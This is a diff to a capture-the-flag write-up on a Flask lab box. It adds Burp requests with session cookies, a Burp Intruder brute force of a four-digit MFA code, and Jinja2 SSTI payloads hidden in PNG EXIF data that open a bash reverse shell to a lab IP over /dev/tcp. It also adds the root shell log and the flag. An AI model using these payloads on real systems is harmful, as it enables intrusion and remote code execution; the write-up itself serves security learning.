@@ -75,14 +75,15 @@ Created a standard user account via registration
 
 **Target Endpoints Discovered:**
 - `/api/users/all` - Returns all user data including plaintext passwords
-- `/admin/login` - Admin login with MFA protection
+- `/login` - Login with MFA protection (when enabled)
 - `/admin/logo_preview?file=` - Logo preview with EXIF metadata display
-- `/admin/upload` - Logo upload functionality (PNG only)
-- `/admin/users` - User permission management
+- `/admin/upload_logo` - Logo upload functionality (PNG only)
+- `/admin/make_admin` - User permission
+- `/mfa` - MFA
 
 **Summary:**
 - **Framework:** Flask/Werkzeug with Jinja2 templating
-- **Authentication:** Session-based with MFA for admin
+- **Authentication:** Session-based with MFA
 - **File Upload:** PNG images only, EXIF metadata extracted and displayed
 - **Authorization:** Role-based (user/admin)
 
@@ -129,7 +130,16 @@ Created a standard user account via registration
 
 ```http
 GET /api/users/all HTTP/1.1
-Host: [target]
+Host: 10.1.148.204
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.1.148.204/admin/dashboard
+Connection: keep-alive
+Cookie: session=.eJyrVirKz0lVslJKTMnNzFPSUSpOLS7OzM-Lz0wBCRqkWZgmJpnpmqSZGuiamBha6CamGRvrphoYWaSaGhgbpiQlAfWUFqcWwY2oBQAlLhit.aXQNjw.brj1k9EA3pF9dV6otyQYtHEsUYM
+X-PwnFox-Color: blue
+Priority: u=4
 ```
 
 **Response:**
@@ -159,11 +169,23 @@ Attempted admin login but account protected by MFA (4-digit code).
 **Burp Intruder Configuration:**
 
 ```
-POST /admin/verify-mfa HTTP/1.1
-Host: [target]
+POST /mfa HTTP/1.1
+Host: 10.1.148.204
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
 Content-Type: application/x-www-form-urlencoded
+Content-Length: 9
+Origin: http://10.1.148.204
+Connection: keep-alive
+Referer: http://10.1.148.204/mfa
+Cookie: session=eyJtZmFfdXNlciI6ImFkbWluIiwic2Vzc2lvbl9pZCI6ImEwZjg1YWI2LTRmNTAtNDQxOC1hZjMzLWUwMjhlNTAzMWRiYiJ9.aXQLlg.jRkZcwNEVTsgYnDXu58wRHduDo8
+Upgrade-Insecure-Requests: 1
+X-PwnFox-Color: blue
+Priority: u=0, i
 
-code=§0001§
+code=§1234§
 ```
 
 - **Payload:** Numbers 0001-9999
@@ -215,6 +237,59 @@ nc -lvnp 4444
 
 ```bash
 convert -size 1x1 xc:white /tmp/shell.png
+exiftool -Artist='{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("bash -c \"bash -i >& /dev/tcp/10.200.31.196/4444 0>&1\"").read() }}' /tmp/shell.png
+```
+
+**Execution:**
+1. Uploaded `shell.png` with SSTI payload
+2. Triggered `/admin/logo_preview?file=shell.png`
+3. Received root shell on netcat listener
+
+### Step 6: Flag Capture
+
+```bash
+──(kali㉿kali)-[~/]
+└─$ nc -nvlp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.1.148.204 35700
+bash: cannot set terminal process group (610): Inappropriate ioctl for device
+bash: no job control in this shell
+root@ip-10-1-148-204:/home/ubuntu# ll /root
+ll /root
+total 40
+drwx------  5 root root 4096 Jan 20 19:25 ./
+drwxr-xr-x 22 root root 4096 Jan 23 23:54 ../
+-rw-------  1 root root  145 Jan 24 00:44 .bash_history
+-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
+-rw-------  1 root root   20 Jan 11 03:19 .lesshst
+drwxr-xr-x  3 root root 4096 Jan 20 19:25 .local/
+-rw-r--r--  1 root root  161 Apr 22  2024 .profile
+drwx------  2 root root 4096 Jan 10 17:49 .ssh/
+-rw-r--r--  1 root root   18 Jan 20 19:25 root.txt
+drwx------  3 root root 4096 Jan 10 17:49 snap/
+```
+
+```bash
+root@ip-10-1-148-204:/home/ubuntu# cat /root/root.txt
+cat /root/root.txt
+HSM{a3fec2e83dad}
+```
+
+> **⚠️ Note:** Server was running as root - no privilege escalation required. This is a critical misconfiguration.
+
+---
+
+## Flag / Objective Achieved
+
+✅ **Objective:** Gained root shell via SSTI in EXIF metadata rendering
+
+✅ **Flag:** Retrieved from `/root/root.txt`
+
+---
+**Alternative Payload**
+
+```bash
+convert -size 1x1 xc:white /tmp/shell.png
 exiftool -Artist='{{lipsum.__globals__.os.popen("bash -c \"bash -i >& /dev/tcp/10.200.31.196/4444 0>&1\"").read()}}' /tmp/shell.png
 ```
 
@@ -234,32 +309,7 @@ exiftool -Artist='{{lipsum.__globals__.os.popen("bash -c \"bash -i >& /dev/tcp/1
 - Often not filtered (unlike `config`, `request`, `self`)
 - Provides access to imported modules like `os`
 
-**Execution:**
-1. Uploaded `shell.png` with SSTI payload
-2. Triggered `/admin/logo_preview?file=shell.png`
-3. Received root shell on netcat listener
-
-### Step 6: Flag Capture
-
-```bash
-id
-# uid=0(root) gid=0(root) groups=0(root)
-
-cat /root/root.txt
-# FLAG{...}
-```
-
-> **⚠️ Note:** Server was running as root - no privilege escalation required. This is a critical misconfiguration.
-
----
-
-## Flag / Objective Achieved
-
-✅ **Objective:** Gained root shell via SSTI in EXIF metadata rendering
-
-✅ **Flag:** Retrieved from `/root/root.txt`
-
----
+--
 
 ## Key Learnings
 
@@ -452,7 +502,7 @@ mv test.png '{{7*7}}.png'
 
 **SSTI Resources:**
 - [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
-- [HackTricks - SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/)
+- [HackTricks - SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
 - [PortSwigger - Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
 
 **EXIF Exploitation:**
